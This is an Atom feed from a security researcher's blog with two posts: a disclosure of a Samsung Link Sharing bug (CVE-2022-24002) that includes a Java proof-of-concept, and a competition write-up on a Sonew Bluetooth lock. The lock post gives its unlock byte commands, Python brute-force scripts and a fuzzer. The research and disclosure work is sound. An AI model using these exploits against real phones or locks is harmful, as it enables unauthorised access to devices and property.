<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-18T10:00:04-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">YayWebsiteYay (I suck at titles)</title><subtitle>Sometimes I want to publish stuff unfiltered.</subtitle><entry><title type="html">CVE-2022-24002 - Samsung Link Sharing Start Any Activity</title><link href="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html" rel="alternate" type="text/html" title="CVE-2022-24002 - Samsung Link Sharing Start Any Activity" /><published>2022-02-11T10:00:00-05:00</published><updated>2022-02-11T10:00:00-05:00</updated><id>http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity</id><content type="html" xml:base="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html">&lt;p&gt;In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Any exported activity&lt;/li&gt;
  &lt;li&gt;Any protected activity within the Link Sharing application&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I submitted this bug to Samsung but they said someone else already reported it. Today Samsung publicly disclosed the CVE ID for this issue, and credit goes to Dawuge of Pangu Team. I guess it is safe for me to disclose my PoC for it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Intent intent = new Intent();
intent.setComponent(new ComponentName(&quot;com.samsung.android.app.simplesharing&quot;, &quot;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity&quot;));

Intent intent2 = new Intent();
intent2.setComponent(new ComponentName(&quot;com.sec.android.app.sbrowser&quot;, &quot;com.sec.android.app.sbrowser.SBrowserLauncherActivity&quot;)); // replace with any other target component
intent2.setData(Uri.parse(&quot;https://www.f-secure.com&quot;));
intent2.putExtra(&quot;yay&quot;, &quot;boo&quot;);

Bundle bundle = new Bundle();
bundle.putInt(&quot;extra_request_code&quot;, 9001);
bundle.putParcelable(&quot;extra_former_intent&quot;, intent2);

intent.putExtras(bundle);

startActivity(intent);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h2&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreConditionActivity&lt;/code&gt; is opened, the Intent is passed onto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionViewModel.handlePrecondition(intent)&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionActivity extends AppCompatActivity {

    public void onCreate(Bundle bundle) {
        AndroidInjection.inject(this);
        ...
        PreconditionViewModel viewModel = getViewModel();
        ...
        viewModel.handlePrecondition(intent);
    }

    public final PreconditionViewModel getViewModel() {
        return (PreconditionViewModel) this.viewModel$delegate.getValue();
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The Intent is processed, and the parcelable extra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extra_former_intent&lt;/code&gt; is stored in the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt;. This variable can then be called via the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFormerIntent()&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionViewModel extends AndroidViewModel {

    private Intent formerIntent;

    public final void handlePrecondition(Intent intent) {
        if (!this.isInit) {
            this.isInit = true;
            if (isFromSdk(intent)) {
                this.callerType = CallerType.TYPE_SDK;
                if (enforceShowPermissionNotice()) {
                    setShouldEnforceShowPermissionNotice();
                } else {
                    setShouldRequestPermission();
                }
            } else if (isOptionalContactRequest(intent)) {
                setShouldRequestContactPermission();
            } else if (isOptionalCameraRequest(intent)) {
                setShouldRequestCameraPermission();
            } else {
                Intent intent2 = (Intent) intent.getParcelableExtra(&quot;extra_former_intent&quot;);
                this.formerIntent = intent2;
                ...
    }

    public final Intent getFormerIntent() {
        return this.formerIntent;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Going back to the class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity&lt;/code&gt;, the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startFormalIntentActivity()&lt;/code&gt; is called which then retrieves the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFormerIntent()&lt;/code&gt;, and then calls class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.common.util.NavigatorUtil&lt;/code&gt; method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivityFromFormerIntent(Activity, Intent)&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionActivity extends AppCompatActivity {

    public final void startFormalIntentActivity() {
        if (getViewModel().isProcessRestart()) {
            NavigatorUtil.startHistoryActivity$default(NavigatorUtil.INSTANCE, this, false, null, 6, null);
        } else {
            Intent formerIntent = getViewModel().getFormerIntent();
            if (formerIntent != null) {
                NavigatorUtil.INSTANCE.startActivityFromFormerIntent(this, formerIntent);
            }
        }
        finishWithSuccess();
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; is finally passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity(Activity, Intent)&lt;/code&gt;, where the component in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; is used to start a new activity:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.common.util;

public final class NavigatorUtil {

    public final void startActivityFromFormerIntent(Activity activity, Intent intent) {
        Intent copyIntent = copyIntent(intent);
        if (intent.getClipData() != null) {
            copyIntent.setClipData(intent.getClipData());
            copyIntent.addFlags(1);
        }
        INSTANCE.startActivity(activity, copyIntent);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="research" /><category term="bug" /><category term="collision" /><summary type="html">In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:</summary></entry><entry><title type="html">Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”</title><link href="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" rel="alternate" type="text/html" title="Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”" /><published>2021-12-31T10:00:00-05:00</published><updated>2021-12-31T10:00:00-05:00</updated><id>http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own</id><content type="html" xml:base="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html">&lt;p&gt;In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image1.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth.&lt;/p&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;

&lt;p&gt;Inside the lock:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image2.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image3.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some features of the lock:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Communicated over Bluetooth with a physical 4 directional button unlock option&lt;/li&gt;
  &lt;li&gt;If you use Bluetooth, you need to know the lock’s 6 digit passcode&lt;/li&gt;
  &lt;li&gt;The phone can store this passcode for easy access&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered.&lt;/p&gt;

&lt;h1 id=&quot;unlock-the-lock&quot;&gt;Unlock the lock&lt;/h1&gt;

&lt;p&gt;The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;lock-the-lock&quot;&gt;Lock the lock&lt;/h1&gt;

&lt;p&gt;THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;send-passcode&quot;&gt;Send passcode&lt;/h1&gt;

&lt;p&gt;The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the passcode was correct, the lock would respond with the following bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x59 0xf0 0x00 0x95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;change-passcode&quot;&gt;Change passcode&lt;/h1&gt;

&lt;p&gt;The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the old passcode was correct, the lock would respond with the following bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x58 0xf0 0x00 0x95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;change-4-directional-button-code&quot;&gt;Change 4 directional button code&lt;/h1&gt;

&lt;p&gt;The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the old button code was correct, the lock would respond with the following bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x60 0xf0 0x00 0x95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;brute-force-option&quot;&gt;Brute Force Option&lt;/h2&gt;

&lt;p&gt;The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def guess_password_method(i):
    password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28])
    open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD])
    if len(str(i)) &amp;lt; 6:
        padding = &quot;0&quot; * (6 - (int(len(str(i)))))
        padding += str(i)
    code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        password_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    #if i % 100 == 0:
    #    print(&apos;sending 0xff 0x00 0xff&apos;)
    #    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF]))
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code)
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code)
    yay = padding + &quot; &quot; + code
    return yay


def handle_data(handle, value):
    response = hexlify(value)
    if &quot;59f00095&quot; in str(response):
        print(&quot;Received &apos;guess password success&apos; repsonse (%s)&quot; % str(response))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def change_physical_method(i):
    # ff xx xx xx xx xx xx yy yy yy yy yy yy fe
    physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot;
    if len(str(i)) &amp;lt; 6:
        padding = &quot;0&quot; * (6 - (int(len(str(i)))))
        padding += str(i)
    else :
        padding = str(i)
    code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] &amp;gt; 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False)
    print(padding + &quot; &quot; + code)

def handle_data(handle, value):
    response = hexlify(value)
    # 60 f0 00 95
    if &quot;60f00095&quot; in str(response):
        print(&quot;Received repsonse (%s)&quot; % str(response))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition.&lt;/p&gt;

&lt;h2 id=&quot;hidden-command&quot;&gt;Hidden Command&lt;/h2&gt;

&lt;p&gt;At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with &lt;em&gt;something&lt;/em&gt; if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xXX - beginning byte
    |__0xYY 0xYY 0xYY 0xYY - some data
                         |__0xZZ - end byte
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For example, sending the real OPEN command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD&lt;/code&gt; would result in the lock responding with some bytes, but sending a different payload, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE&lt;/code&gt; would result in the lock not sending any data back.&lt;/p&gt;

&lt;p&gt;Additionally, the middle data must be the correct length. For example, sending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD&lt;/code&gt; is a valid command, but sending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD&lt;/code&gt; is not a valid command.&lt;/p&gt;

&lt;p&gt;The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1 byte at the beginning&lt;/li&gt;
  &lt;li&gt;Anywhere between 1 and 18 bytes for the middle data&lt;/li&gt;
  &lt;li&gt;1 byte at the end&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So lets make a script which will attempt to find additional commands within the above parameters:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pygatt
from binascii import hexlify
import sys
import math
from concurrent import futures
import random
import time

adapter = pygatt.backends.GATTToolBackend(&apos;hci0&apos;)

def handle_data(handle, value):
    response = hexlify(value)
    print(&quot;Received repsonse (%s)&quot; % str(response))

def decimal_to_hexadecimal(dec): 
    decimal = int(dec) 
    return hex(decimal)

def fuzz_function(payload1, payload2, paddingCounter):
  #create temp code
  temp_code_length = paddingCounter + 2
  temp_code_array = bytearray(temp_code_length)
  #create byte array payload
  temp_code_array[0] = payload1
  temp_code_array[temp_code_length - 1] = payload2
  #temp_code_array[temp_code_length]
  print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2))
  device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array)

adapter.start()
device = adapter.connect(&apos;28:EC:9A:09:C7:2B&apos;)

device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False)
device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True)

payload1 = 0
paddingCounter = 1

# modify payload 2
payload2 = 0

while payload2 != 256:
  while paddingCounter != 19:
    fuzz_function(payload1, payload2, paddingCounter)
    paddingCounter = paddingCounter + 1
  paddingCounter = 1
  payload2 = payload2 + 1

adapter.stop()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect.&lt;/p&gt;

&lt;p&gt;Thankfully some hidden commands were found:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xEF 0xXX 0xXX 0xXX 0xXX 0xF1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xFD 0xXX 0xXX 0xXX 0xXX 0xFC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def guess_physical_method(i):
    physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot;
    if len(str(i)) &amp;lt; 6:
        padding = &quot;0&quot; * (6 - (int(len(str(i)))))
        padding += str(i)
    else :
        padding = str(i)
    code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] &amp;gt; 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False)
    print(padding + &quot; &quot; + code)

def handle_data(handle, value):
    response = hexlify(value)
    if &quot;e0f0000e&quot; in str(response):
        print(&quot;Received repsonse (%s)&quot; % str(response))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;the-competition&quot;&gt;The Competition&lt;/h2&gt;

&lt;p&gt;After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/lznGZaM2G6M&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image6.jpg&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image4.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image5.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;disclosure-and-files&quot;&gt;Disclosure and Files&lt;/h2&gt;

&lt;p&gt;There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working.&lt;/p&gt;

&lt;p&gt;Files for this research are here: &lt;a href=&quot;https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/&quot;&gt;https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="research" /><category term="research" /><category term="story" /><summary type="html">In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard: The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth. Attack Surface Inside the lock: Some features of the lock: Communicated over Bluetooth with a physical 4 directional button unlock option If you use Bluetooth, you need to know the lock’s 6 digit passcode The phone can store this passcode for easy access The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered. Unlock the lock The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX: 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD Lock the lock THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX: 0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD Send passcode The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9: 0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28 If the passcode was correct, the lock would respond with the following bytes: 0x59 0xf0 0x00 0x95 Change passcode The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode: 0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29 If the old passcode was correct, the lock would respond with the following bytes: 0x58 0xf0 0x00 0x95 Change 4 directional button code The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively: 0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe If the old button code was correct, the lock would respond with the following bytes: 0x60 0xf0 0x00 0x95 Brute Force Option The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created: def guess_password_method(i): password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28]) open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD]) if len(str(i)) &amp;lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: password_code[i2+1] = temp_code[i2] i2 = i2 + 1 #if i % 100 == 0: # print(&apos;sending 0xff 0x00 0xff&apos;) # device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF])) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code) yay = padding + &quot; &quot; + code return yay def handle_data(handle, value): response = hexlify(value) if &quot;59f00095&quot; in str(response): print(&quot;Received &apos;guess password success&apos; repsonse (%s)&quot; % str(response)) As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code: def change_physical_method(i): # ff xx xx xx xx xx xx yy yy yy yy yy yy fe physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot; if len(str(i)) &amp;lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 